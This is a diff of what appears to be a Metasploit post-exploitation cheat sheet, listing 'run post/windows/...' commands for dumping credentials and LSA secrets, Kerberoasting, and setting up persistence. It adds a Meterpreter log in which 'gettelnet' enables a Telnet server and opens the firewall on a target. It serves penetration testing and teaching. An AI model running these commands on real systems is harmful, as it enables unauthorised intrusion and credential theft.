@@ -2,6 +2,12 @@
 
 ## Windows Gather Modules
 
+
+
+run post/windows/manage/powershell/load_script
+
+run post/windows/manage/powershell/build_net_code
+
 run post/windows/gather/enum_ad_service_principal_names (Enum to Kerberoast SPNs)
 
 run post/windows/gather/lsa_secrets (dump LSASS secrets)
@@ -16,7 +22,6 @@ run post/windows/gather/get_bookmarks (get bookmarks from Chrome, Opera, Edge an
 
 run post/windows/gather/enum_chrome (dump chrome browser cache data)
 
-run post/windows/gather/credentials/xchat (harvest hexchat IRC client)
 
 run post/windows/gather/enum_putty_saved_sessions (discover putty SSH sessions)
 
@@ -46,29 +51,15 @@ run post/windows/gather/bitlocker_fvek
 
 run post/windows/gather/dnscache_dump
 
-run post/windows/gather/enum_ad_bitlocker
-
-run post/windows/gather/enum_ad_computers
-
 run post/windows/gather/credentials/aim
-
-run post/windows/gather/enum_ad_groups
 
 run post/windows/gather/credentials/avira_password
 
-run post/windows/gather/enum_ad_managedby_groups
-
 run post/windows/gather/credentials/bulletproof_ftp
-
-run post/windows/gather/enum_ad_to_wordlist
 
 run post/windows/gather/credentials/comodo
 
-run post/windows/gather/enum_ad_user_comments
-
 run post/windows/gather/credentials/coolnovo
-
-run post/windows/gather/enum_ad_users
 
 run post/windows/gather/credentials/coreftp
 
@@ -80,27 +71,17 @@ run post/windows/gather/credentials/dynazip_log
 
 run post/windows/gather/credentials/dyndns
 
-run post/windows/gather/enum_computers
-
 run post/windows/gather/credentials/enum_cred_store
 
 run post/windows/gather/enum_db
-
-run post/windows/gather/credentials/enum_laps
 
 run post/windows/gather/credentials/enum_picasa_pwds
 
 run post/windows/gather/credentials/epo_sql
 
-run post/windows/gather/enum_domain
-
 run post/windows/gather/credentials/filezilla_server
 
-run post/windows/gather/enum_domain_group_users
-
 run post/windows/gather/credentials/flashfxp
-
-run post/windows/gather/enum_domain_tokens
 
 run post/windows/gather/credentials/flock
 
@@ -116,9 +97,6 @@ run post/windows/gather/enum_emet
 
 run post/windows/gather/credentials/gadugadu
 
-run post/windows/gather/enum_files
-
-run post/windows/gather/credentials/gpp
 
 run post/windows/gather/enum_hostfile
 
@@ -131,8 +109,6 @@ run post/windows/gather/credentials/icq
 run post/windows/gather/enum_ie
 
 run post/windows/gather/credentials/idm
-
-run post/windows/gather/enum_logged_on_users
 
 run post/windows/gather/credentials/ie
 
@@ -166,19 +142,15 @@ run post/windows/gather/credentials/mcafee_vse_hashdump
 
 run post/windows/gather/credentials/mdaemon_cred_collector
 
-
-
 run post/windows/gather/credentials/meebo
 
-run post/windows/gather/enum_snmp
+
 
 run post/windows/gather/credentials/miranda
 
 run post/windows/gather/enum_termserv
 
 run post/windows/gather/credentials/mremote
-
-run post/windows/gather/enum_tokens
 
 run post/windows/gather/credentials/mssql_local_hashdump
 
@@ -242,8 +214,6 @@ run post/windows/gather/credentials/steam (steam)
 
 run post/windows/gather/credentials/tango
 
-run post/windows/gather/phish_windows_credentials
-
 run post/windows/gather/credentials/teamviewer_passwords
 
 run post/windows/gather/resolve_sid
@@ -296,21 +266,14 @@ run post/windows/manage/enable_support_account
 
 run post/windows/manage/sshkey_persistence
 
-run post/windows/manage/exec_powershell
 
-run post/windows/manage/powershell/build_net_code
 
 run post/windows/manage/sticky_keys
 
-run post/windows/manage/execute_dotnet_assembly
-
-run post/windows/manage/powershell/exec_powershell
 
 run post/windows/manage/forward_pageant
 
-run post/windows/manage/powershell/load_script
 
-run post/windows/manage/vss
 
 run post/windows/manage/hashcarve
 
@@ -608,6 +571,8 @@ run post/apple_ios/gather/ios_text_gather
 
 ## Others
 
+run multi_console_command
+
 run domain_list_gen
 
 run duplicate
@@ -617,3 +582,34 @@ run enum_putty
 run enum_vmware
 
 run event_manager
+
+run scraper
+
+run winenum
+
+```
+meterpreter > run gettelnet 
+Windows Telnet Server Enabler Meterpreter Script                                                                 
+Usage: gettelnet -u <username> -p <password>                                                                     
+                                                                                                                 
+OPTIONS:                                                                                                         
+                                                                                                                 
+    -e        Enable Telnet Server only.                                                                         
+    -f <opt>  Forward Telnet Connection.                                                                         
+    -h        Help menu.
+    -p <opt>  The Password of the user to add.
+    -u <opt>  The Username of the user to add.
+
+meterpreter > run gettelnet -e
+[*] Windows Telnet Server Enabler Meterpreter Script
+[*] Checking if Telnet Service is Installed
+[*] Checking if Telnet is installed...
+[*] Telnet Service Installed on Target
+[*] Setting Telnet Server Services service startup mode
+[*]     The Telnet Server Services service is not set to auto, changing it to auto ...
+[*]     Opening port in local firewall if necessary
+[*] For cleanup use command: run multi_console_command -r /home/omer/.msf4/logs/scripts/gettelnet/clean_up__20201015.0421.rc
+meterpreter >
+```
+
+https://www.hackers-arise.com/ultimate-list-of-meterpreter-scripts
